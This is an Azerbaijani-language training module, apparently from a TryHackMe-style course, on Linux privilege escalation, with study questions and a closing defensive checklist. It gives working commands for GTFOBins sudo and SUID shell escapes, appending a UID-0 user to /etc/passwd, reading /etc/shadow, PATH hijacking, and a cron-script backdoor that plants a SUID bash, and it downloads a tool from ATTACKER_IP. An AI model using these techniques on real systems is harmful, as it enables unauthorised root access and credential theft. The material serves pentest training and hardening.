# Room: Linux PrivEsc — Praktiki Texnikalar

**Path:** Privilege Escalation
**Module:** Linux PrivEsc
**Çətinlik:** Intermediate
**Təxmini vaxt:** 2 saat

## Room haqqında

Əsaslar room-u xəritəni verdi; bu room xəritənin ən məhsuldar yollarını addım-addım gəzir: `sudo -l` icazələri, yazıla bilən `/etc/passwd` və GTFOBins dünyası. Hər texnika konkret lab ssenarisi ilə — əmr çıxışları ilə — göstərilir. Öz lab-ınızda (TryHackMe Linux privesc room-ları, VulnHub) hər birini əl ilə keçmək tövsiyə olunur.

## Öyrənmə nəticələri

- `sudo -l` çıxışını oxumağı və icazələri istismar etməyi
- GTFOBins konseptini və istifadəsini tətbiq etmək
- Yazıla bilən `/etc/passwd` texnikasını addım-addım icra etmək
- Tapıntıdan istismara tam keçidi (enum → texnika → root) bacarmaq

## Task 1 — sudo -l: İcazələrin Qapısı

**sudo** — adi istifadəçiyə müəyyən əmrləri başqaları (adətən root) adına işə salmaq icazəsi. Konfiqurasiya `/etc/sudoers`-də (və `/etc/sudoers.d/`-də). İstifadəçinin öz icazələrini görməsi:

```bash
sudo -l
```

Klassik çıxış (lab-larda ən məşhur variant):

```
User user1 may run the following commands on host:
    (root) NOPASSWD: /usr/bin/vim
```

Bu tərcümə olunur: `user1`, parol soruşulmadan (`NOPASSWD`), `vim`-i root kimi işə sala bilər. Vim-in özü isə redaktor olmaqla birlikdə **shell açıq buraxır**: `:!sh` (vim daxilində əmr icrası) → root shell.

Axın:

```bash
sudo vim
# vim daxilində:
:!sh
# → # (root prompt)
```

Digər tipik "təhlükəli icazə" nümunələri:

| sudo -l nəticəsi | Niyə təhlükəli | İstismar |
|---|---|---|
| `NOPASSWD: /usr/bin/vim` | vim shell açır | `sudo vim -c '!sh'` |
| `NOPASSWD: /usr/bin/find` | find əmr icra edə bilir | `sudo find . -exec /bin/sh \;` |
| `NOPASSWD: /usr/bin/awk` | awk sistem əmri | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `NOPASSWD: /usr/bin/less` | less shell açır | `sudo less` → `!sh` |
| `NOPASSWD: /usr/bin/tar` | tar checkpoint | `sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `(ALL : ALL) ALL` parolsuz | hər şey | `sudo bash` — birbaşa |

**GTFOBins** (bütün bunların ensiklopediyası): gtfobins.github.io — "hansı leqal proqram hansı yolla istismar olunur" bazası. SUID/sudo/shell escape/file read/write — hər proqram üçün hazır əmrlər. Peşəkar vərdiş: `sudo -l` və ya SUID siyahısında tanımadığın/half-tanıdığın binary görəndə GTFOBins-də yoxlamaq.

Bir vacib məhdudiyyət: `sudo -l` siyahısı yalnız **qeyd olunan** binary-ləri verir — amma GTFOBins texnikası binary-nin **öz funksiyaları** daxilindədir (vim-in `!` əmri, find-in `-exec` flag-ı). Yəni icazə "vim"dirsə, "vim-in daxilində shell" hələ də icazə sərhəddindədir — bu, sudoers konfiqurasiyasının incə tələsi: **qəti yox, proqram-səviyyəli məhdudiyyət** lazımdır (məs. sudoers-də NOPASSWD: /usr/bin/vim -u /etc/safe-vimrc kimi arqument məhdudiyyəti).

**Sual 1**
`sudo -l` nə göstərir və niyə ilk yoxlama flaqıdır?

**Sual 2.**
"vim icazəsi = shell" necə işləyir?

**Sual 3.**
GTFOBins nədir və nə vaxt müraciət olunur?

## Task 2 — Yazıla Bilən /etc/passwd: Klassika

`/etc/passwd` — istifadəçi bazası. Normalda:

```
root:x:0:0:root:/root:/bin/bash
user1:x:1000:1000:User One:/home/user1:/bin/bash
```

İkinci sahə (`x`) — parolun `/etc/shadow`-da olduğunu bildirir. Amma köhnə/uyğun sistemlər passwd daxilində **hash** da saxlaya bilər. Əgər passwd yazıla biləndirsə (yanlış icazələr — lab-ların klassikası) — öz root istifadəçimizi yaza bilərik.

**Addım-addım:**

1. **Yazma icazəsinin yoxlanması:**

```bash
ls -la /etc/passwd
-rw-rw-r-- 1 root user1 ... /etc/passwd     # user1 qrupuna yazma — qapıdır
```

2. **Parol hash-inin yaradılması** (openssl ilə):

```bash
openssl passwd -6 -salt xyz mypassword123
# $6$xyz$hash...hash...
```

3. **Yeni root istifadəçisi əlavəsi** (UID 0 = root):

```bash
echo 'hacker:$6$xyz$hash...:0:0::/tmp:/bin/bash' >> /etc/passwd
```

4. **Giriş:**

```bash
su hacker
Password: mypassword123
# → root shell (id → uid=0)
```

Niyə işləyir: sahə 3 (`0`) — UID; Linux UID 0 = root kimi tanınır. Autentifikasiya isə shadow-a baxmadan passwd-dəki hash-dən keçir (shadow-da qeyd olunmayan istifadəçi üçün passwd-dəki hash istifadə olunur).

Variasiya: `root` sətrinin `x`-ini hazırladığımız hash ilə əvəzləmək (root parolunu "bilmək"). Eyni nəticə.

Müdafiə dərsi: kritik sistem fayllarının icazələri audited: `/etc/passwd` — root:root 644; `/etc/shadow` — root:shadow 640 (yazma yalnız root). Bu cür sadə konfiqurasiya gigiyenası praktikada nə qədər həyati olur — lab-lar bunu göstərir.

**Sual 1**
/etc/passwd-in hansı strukturundan istifadə olunur (texnika üçün)?

**Sual 2.**
Niyə yeni istifadəçinin UID-si 0 qoyulur?

**Sual 3.**
Bu texnikanın müdafiə tərəfi nədir?

## Task 3 — SUID + GTFOBins: Binary-lərin İkinci Həyatı

SUID əsasları əvvəlki room-dan; indi praktika. Ssenari: enum (linpeas və ya find) SUID siyahısı verdi:

```bash
find / -perm -4000 -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
...
/usr/bin/base64          # ← qeyri-standart! SUID base64?
/opt/backup/runme        # ← custom SUID binary
```

**Hal 1 — SUID-lə qeyri-standart sistem binary-si (base64):** GTFOBins-də base64 SUID bölməsi: fayl oxuma imkanı verir:

```bash
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```

Root-un SUID-li base64-si shadow-u oxuyur → hash-lər → crack (hashcat, Kerberoasting room-unun offline dünyası).

**Hal 2 — custom SUID binary (runme):** Öz binary-si SUID alıb — ən aşağı səviyyəli analiz onu tanımaqdır:

```bash
strings /opt/backup/runme | less
# nə çağırır? system("...")? hansı fayllar?
```

Əgər binary `system("backup_helper")` kimi **tam yol olmadan** proqram çağırırsa — PATH manipulyasiyası:

```bash
cd /tmp
echo '/bin/bash' > backup_helper
chmod +x backup_helper
export PATH=/tmp:$PATH
/opt/backup/runme
# → root shell (binary SUID-root-dur, özü də bizim fake helper-i işə salır)
```

**Hal 3 — SUID olan leqal proqramın öz funksiyası:** məşhur nümunə — SUID `env`:

```bash
# GTFOBins: env SUID
env /bin/sh -p
```

`-p` — privilesləri qoru (SUID binary-dən shell açarkən effektiv UID-ni saxla). Bu `-p` flag-ı SUID istismarının standart detalıdır.

SUID praktikasının üç dərsi:

1. **Qeyri-standart SUID = dərhal GTFOBins + strings analizi.**
2. **PATH manipulyasiyası** — custom binary-lərin ən çox qapısı.
3. **SUID shell verməyən proqramlar belə** (base64 kimi) fayl oxuma/yazma kimi kifayət qədər təhlükəli funksiyalar verir.

**Sual 1**
SUID base64 hansı praktiki fayda verir?

**Sual 2.**
Custom SUID binary-nin PATH manipulyasiyası nə ilə işləyir?

**Sual 3.**
`/bin/sh -p`-dəki `-p` nə edir?

## Task 4 — Kompleks Ssenari: Enum-dan Root-a

Bütün texnikaları birləşdirən tam ssenari (lab-məntiqli — öz mühitinizdə təkrarlayın):

**Vəziyyət:** Veb tətbiqində RCE → `www-data` shell (webshell/reverse shell). Məqsəd: root.

**Addım 1 — Mövqe qiymətləndirməsi:**

```bash
id                          # uid=33(www-data)
sudo -l                     # "Sorry, user www-data may not run sudo" — yol yox
```

**Addım 2 — Enum (linpeas köçürülür):**

```bash
# Attacker maşında:
python3 -m http.server 8080
# Hədəfdə:
curl http://ATTACKER_IP:8080/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | less
```

**Addım 3 — Tapıntıların təhlili** (çıxışda vurğulananlar):

- `/etc/cron.d/backup` → `*/5 * * * * root /opt/scripts/backup.sh`
- `/opt/scripts/backup.sh` → `-rwxrwxr-- root:www-data` — **biz (www-data) yaza bilərik!**
- Əlavə: SUID siyahısı təmiz, kernel yeni (exploit yox).

**Addım 4 — İstismar (cron qapısı):**

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# gözlə (max 5 dəqiqə) — cron root kimi icra edir
/tmp/rootbash -p
id     # uid=0(root) euid=0 — ROOT
```

Qeyd: `bash -p` SUID shell üçün (yuxarıdakı `-p` prinsipi); cron-un öz yolu ilə də (`rm /tmp/f;mkfifo...` reverse shell) olardı — amma rootbash daha sabit.

**Addım 5 — Post-root yoxlamalar:** nə qazanıldı: shadow oxunuşu (hash-lər — digər sistemlər üçün), bütün fayllar, davamlılıq (persistence module-un mövzusu). Hesabat üçün sübut: `id` çıxışı + yaranan fayl izləri.

Ssenarinin dərsləri:

1. **Addımlar məntiqlə bağlanır:** RCE → enum → cron tapıntısı → yazma → gözləmə → root. Heç bir "sehr" yoxdur — hər addım əvvəlkinin nəticəsidir.
2. **Enum qərar verir:** linpeas olmadan cron+icazə birləşməsini tapmaq (minlərlə fayl arasından) çətin idi; alət siyahı verdi, insan seçdi.
3. **ROE:** istismar yalnız lab/razılaşdırılmış hədəfdə; cron dəyişmə kimi "sistemə toxunan" hərəkətlər real pentest-də client ilə əvvəlcədən müzakirə olunmalıdır.

**Sual 1**
Ssenaridə linpeas-ın rolu nə idi?

**Sual 2.**
`/tmp/rootbash -p` niyə root verir?

**Sual 3.**
Bu ssenarinin "heç bir sehr yoxdur" dərsi nə deməkdir?

## Task 5 — Müdafiə Xülasəsi və Module Yekunu

Praktik texnikaların hamısının müdafiə tərəfi bir yerdə:

**sudo -l / GTFOBins qarşısı:**

- Minimal sudoers qaydaları — yalnız konkret, məqsədli əmrlər.
- Təhlükəli binary-lərə (vim, less, find, awk) sudo verilməsi QADAĞAN — əvəzində məhdud wrapper-lər/skriptlər.
- Sudoers redaktəsi yalnız `visudo` ilə (sintaksis xətası sistemi kilidləməsin).

**Fayl icazələri (passwd texnikası qarşısı):**

- `/etc/passwd` 644 root:root; `/etc/shadow` 640 root:shadow.
- Müntəzəm icazə auditləri (osscan/scripts): `find / -perm -4000` müqayisəli siyahılar.

**SUID gigiyenası:**

- Distribution default-dan kənar SUID yoxdur; custom SUID qəti qadağan.
- Mount-larda `nosuid` (məs. /tmp, removable).

**Cron gigiyenası:**

- Cron script-ləri root:root 755, yalnız root yazma.
- Script-lərdə tam yollar (`/usr/bin/tar`), wildcard ehtiyatla.
- Cron qovluqlarının icazə auditi.

**Sistem səviyyəli:**

- Patch idarəetməsi (kernel exploit qapısı).
- noexec/nosuid mount strategiyası.
- EDR/monitorinq: SUID dəyişiklikləri, cron dəyişiklikləri, qeyri-adi sudo istifadələri.

Module (Linux PrivEsc) yekununda — iki room-un vahidi:

- **Əsaslar:** privesc modeli — SUID/SGID, kernel, cron, yazıla bilən kritik fayllar + enum alətləri (linpeas/LES/pspy).
- **Praktika:** sudo -l + GTFOBins, /etc/passwd, SUID/PATH, kompleks ssenari.

Növbəti module — Windows PrivEsc — eyni strukturu Windows dünyasında təkrarlayacaq: servis konfiqurasiyaları, registry, token-lər. Konseptual körpü artıq qurulub: **privesc = sistemdəki hazır qapıların tapılması və açılması** — OS dəyişsə də, düşüncə modeli eynidir.

**Sual 1**
Sudo qaydalarında "təhlükəli" binary siyahısından üçünü deyin.

**Sual 2.**
Cron gigiyenasının üç prinsipi nədir?

**Sual 3.**
"OS dəyişsə də, düşüncə modeli eynidir" — nəyi ifadə edir?
